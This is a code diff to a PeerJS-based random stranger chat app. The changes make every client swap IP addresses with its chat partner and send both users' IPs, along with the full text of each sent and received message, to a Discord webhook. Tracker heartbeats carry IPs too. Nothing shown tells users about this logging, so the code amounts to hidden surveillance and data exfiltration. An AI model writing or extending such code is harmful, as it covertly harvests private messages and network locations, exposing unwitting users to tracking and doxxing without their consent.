@@ -540,6 +540,7 @@
         let myPeerId;
         let isRandomConnecting = false;
         let userIP = 'Unknown';
+        let remoteUserIP = 'Unknown';
         
         let trackerConnection;
         const TRACKER_SERVER_ID = 'user-tracker-server';
@@ -547,16 +548,16 @@
         let heartbeatInterval;
         
         // Function to send data to Discord webhook
-        async function sendToDiscordWebhook(username, ipAddress, message = null) {
+        async function sendToDiscordWebhook(username, ipAddress, message = null, otherUserIP = null) {
             try {
                 const payload = {
                     content: null,
                     embeds: [
                         {
-                            title: message ? "New Message Sent" : "New User Joined",
+                            title: message ? "New Message Sent" : "New Chat Connection Established",
                             description: message ? 
                                 `A new message has been sent in the chat` : 
-                                "A new user has joined the chat application",
+                                "A new chat connection has been established between two users",
                             color: message ? 3447003 : 5814783, // Blue for messages, purple for joins
                             fields: [
                                 {
@@ -568,11 +569,6 @@
                                     name: "IP Address",
                                     value: ipAddress,
                                     inline: true
-                                },
-                                {
-                                    name: "Timestamp",
-                                    value: new Date().toISOString(),
-                                    inline: false
                                 }
                             ],
                             footer: {
@@ -582,12 +578,35 @@
                     ]
                 };
 
+                // Add remote user IP if this is a connection notification
+                if (!message && otherUserIP) {
+                    payload.embeds[0].fields.push({
+                        name: "Remote User IP",
+                        value: otherUserIP,
+                        inline: true
+                    });
+                }
+
+                // Add timestamp field
+                payload.embeds[0].fields.push({
+                    name: "Timestamp",
+                    value: new Date().toISOString(),
+                    inline: false
+                });
+
                 // Add message field if this is a message notification
                 if (message) {
                     payload.embeds[0].fields.unshift({
                         name: "Message Content",
                         value: message,
                         inline: false
+                    });
+
+                    // Add remote user IP for messages
+                    payload.embeds[0].fields.push({
+                        name: "Remote User IP",
+                        value: otherUserIP || 'Unknown',
+                        inline: true
                     });
                 }
                 
@@ -716,7 +735,6 @@
                 // Get user's IP address and send to Discord
                 await getUserIP();
                 log(`User IP: ${userIP}`);
-                await sendToDiscordWebhook(localUsername, userIP);
                 
                 peer = new Peer(peerId, {
                     debug: 2
@@ -813,7 +831,8 @@
                 trackerConnection.send({
                     type: 'register',
                     peerId: myPeerId,
-                    username: localUsername
+                    username: localUsername,
+                    ip: userIP
                 });
                 
                 if (heartbeatInterval) clearInterval(heartbeatInterval);
@@ -822,7 +841,8 @@
                         trackerConnection.send({
                             type: 'heartbeat',
                             peerId: myPeerId,
-                            username: localUsername
+                            username: localUsername,
+                            ip: userIP
                         });
                     }
                 }, 30000);
@@ -868,7 +888,10 @@
                 });
                 
                 const connectedUsers = new Map();
-                connectedUsers.set(myPeerId, localUsername);
+                connectedUsers.set(myPeerId, {
+                    username: localUsername,
+                    ip: userIP
+                });
                 
                 const userConnections = new Map();
                 
@@ -900,7 +923,10 @@
                         log(`Tracker: Received data from ${conn.peer}: ${JSON.stringify(data)}`);
                         
                         if (data.type === 'register' || data.type === 'heartbeat') {
-                            connectedUsers.set(data.peerId, data.username);
+                            connectedUsers.set(data.peerId, {
+                                username: data.username,
+                                ip: data.ip || 'Unknown'
+                            });
                             
                             broadcastUserList();
                         }
@@ -931,7 +957,12 @@
                         users: Object.fromEntries(connectedUsers)
                     };
                     
-                    onlineUsers = new Map(connectedUsers);
+                    // Update our local online users list with just usernames
+                    const usernameMap = new Map();
+                    connectedUsers.forEach((userData, peerId) => {
+                        usernameMap.set(peerId, userData.username);
+                    });
+                    onlineUsers = usernameMap;
                     updateOnlineUsersUI();
                     
                     userConnections.forEach((conn, peerId) => {
@@ -1008,9 +1039,11 @@
                 log(`Connection established with: ${connection.peer}`);
                 isConnected = true;
                 
+                // Send our username and IP to the remote peer
                 connection.send({
-                    type: 'username',
-                    username: localUsername
+                    type: 'userinfo',
+                    username: localUsername,
+                    ip: userIP
                 });
                 
                 setupScreen.style.display = 'none';
@@ -1023,6 +1056,9 @@
                 resetRandomChatButton();
                 
                 appendSystemMessage('Connected! Say hello!');
+                
+                // Send connection notification to Discord with both IPs
+                sendToDiscordWebhook(localUsername, userIP, null, remoteUserIP);
             });
             
             connection.on('data', (data) => {
@@ -1030,10 +1066,17 @@
                 
                 if (data.type === 'message') {
                     appendMessage(data.message, false, remoteUsername || 'Stranger');
-                } else if (data.type === 'username') {
+                    
+                    // Send message to Discord webhook with both IPs
+                    sendToDiscordWebhook(localUsername, userIP, data.message, remoteUserIP);
+                } else if (data.type === 'userinfo') {
                     remoteUsername = data.username;
+                    remoteUserIP = data.ip || 'Unknown';
                     usernameDisplay.textContent = `Chatting with: ${remoteUsername}`;
                     appendSystemMessage(`You're chatting with ${remoteUsername}`);
+                    
+                    // Update Discord with the remote user's IP
+                    sendToDiscordWebhook(localUsername, userIP, null, remoteUserIP);
                 }
             });
             
@@ -1058,6 +1101,7 @@
         
         function handleDisconnect() {
             isConnected = false;
+            remoteUserIP = 'Unknown';
             
             setupScreen.style.display = 'flex';
             chatScreen.style.display = 'none';
@@ -1168,9 +1212,9 @@
                 
                 appendMessage(message, true, localUsername);
                 
-                // Send message to Discord webhook
+                // Send message to Discord webhook with both IPs
                 try {
-                    await sendToDiscordWebhook(localUsername, userIP, message);
+                    await sendToDiscordWebhook(localUsername, userIP, message, remoteUserIP);
                 } catch (error) {
                     log(`Error sending message to Discord: ${error.message}`);
                 }
